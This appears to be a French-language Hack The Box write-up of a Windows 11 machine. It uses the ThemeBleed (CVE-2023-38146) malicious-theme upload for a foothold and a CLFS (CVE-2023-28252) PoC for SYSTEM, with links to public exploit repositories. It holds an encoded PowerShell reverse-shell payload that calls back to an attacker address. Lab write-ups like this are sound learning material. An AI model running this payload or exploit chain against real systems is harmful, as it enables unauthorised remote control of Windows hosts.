---
date: 2026-04-15
tags:
  - htb
  - medium
  - themebleed
---


# Recon

scan tcp
![[Pasted image 20260415182204.png]]





# Exploit


## port 80

Je commence à regarder les headers HTTP. Cela me permet d'identifier des informations pouvant être utiles comme la technologie utilisée et les cookies.

![[Pasted image 20260415182805.png]]


Sur la page, on y retrouve un site web où l'on peut uploader un fichier `.theme` ou `.themepack`.

![[Pasted image 20260415182821.png]]


![[Pasted image 20260415183355.png]]


![[Pasted image 20260415183408.png]]


Je n'ai pas réussi à trouver de manières d'accéder à l'ordinateur initialement. Il fallait faire une recherche sur "Windows 11 theme exploit", donnant la vulnérabilité ThemeBleed.

![[Pasted image 20260416100321.png]]



J'ai utilisé cet exploit me donnant une session à la cible.
https://github.com/Jnnshschl/CVE-2023-38146#

![[Pasted image 20260416101646.png]]

Il faut executer le script python en y donnant notre ip et port. Il faut ensuite ouvrir un listener.

![[Pasted image 20260416101706.png]]


Ensuite, on y téléverse notre fichier `.theme` malicieux qui a été créé en roulant le script ThemeBleed. 

![[Pasted image 20260416101717.png]]


Et on y reçoit une connexion et on trouve le flag.
![[Pasted image 20260416101710.png]]


![[Pasted image 20260416101825.png]]




# PrivEsc


Au début, j'ai vu qu'on avait des permissions dans le dossier `aero` et j'ai essayé de faire une élévation de privilège en hijackant le binaire `aero.exe`. Toutefois, ça n'a pas fonctionné.

![[Pasted image 20260416102928.png]]



![[Pasted image 20260416103002.png]]




![[Pasted image 20260416103327.png]]


![[Pasted image 20260416103412.png]]


![[Pasted image 20260416103537.png]]


Puisqu'on a les permissions de restart l'ordinateur, je l'ai fait mais je n'avais pas de connexion. Il fallait que je reset la machine.



Ensuite, sur le desktop, on trouve un PDF pour le CVE-2023-28252. Il faut valider qu'on a la version vulnérable de CLFS, et on l'a.

![[Pasted image 20260416110549.png]]



Je trouve cet exécutable pour avoir une élévation de privilège :
https://github.com/bkstephen/Compiled-PoC-Binary-For-CVE-2023-28252?tab=readme-ov-file

![[Pasted image 20260416112356.png]]



J'ai utilise un reverse shell de powershell comme payload.

```
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA1AC4AMQA5ADQAIgAsADQANAAzACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAc
...
```



Après avoir téléversé l'exécutable, j'ouvre un listener et je roule le code.

![[Pasted image 20260416112449.png]]

Je reçois une connexion comme SYSTEM et je suis capable de trouver le flag.

![[Pasted image 20260416112507.png]]


![[Pasted image 20260416112520.png]]


